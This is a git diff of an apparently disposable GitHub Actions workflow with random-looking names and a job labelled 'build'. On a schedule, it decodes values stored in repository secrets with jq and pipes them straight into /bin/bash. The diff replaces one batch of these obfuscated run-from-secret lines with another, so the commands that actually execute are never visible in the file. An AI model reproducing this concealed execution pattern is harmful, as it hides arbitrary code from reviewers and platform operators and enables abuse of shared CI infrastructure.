@@ -3,31 +3,19 @@ name: zhangdiaoyu4617
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 3/6 * * *'
-
-jobs:  # 20099
+    - cron: '0 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangdiaoyu4617
         env:
-          zdb683: ${{ secrets.zdb683 }}
+          fk2: ${{ secrets.fk2 }}
         run: |
-          echo $zdb683 | jq -r .nddc8 | /bin/bash
-          echo $fjhh6 | jq -r .zg0 | /bin/bash
-          echo $fyz22 | jq -r .qeiec20205 | /bin/bash
-          echo $prmec9342 | jq -r .g5 | /bin/bash
-          echo $ccm8715 | jq -r .igr8 | /bin/bash
-          echo $n7328 | jq -r .roen16649 | /bin/bash
-          echo $u68938 | jq -r .h009 | /bin/bash
-          echo $fjhta03 | jq -r .tq707 | /bin/bash
-          echo $fi5 | jq -r .skw79283 | /bin/bash
-          echo $uz81397 | jq -r .c41 | /bin/bash
-          echo $wif37 | jq -r .lav605 | /bin/bash
-          echo $bi9187 | jq -r .qyky37454 | /bin/bash
-          echo $t0 | jq -r .bhbsf7 | /bin/bash
-          echo $ygpng73074 | jq -r .dprpz415 | /bin/bash
-          echo $p8 | jq -r .g902 | /bin/bash
+          echo $fk2 | jq -r .qwzv0 | /bin/bash
+          echo $g5473 | jq -r .sr9 | /bin/bash
+          echo $hcn4644 | jq -r .oluyl2203 | /bin/bash
+          echo $voqe22 | jq -r .y8 | /bin/bash
+          echo $mui6 | jq -r .aq72332 | /bin/bash
 
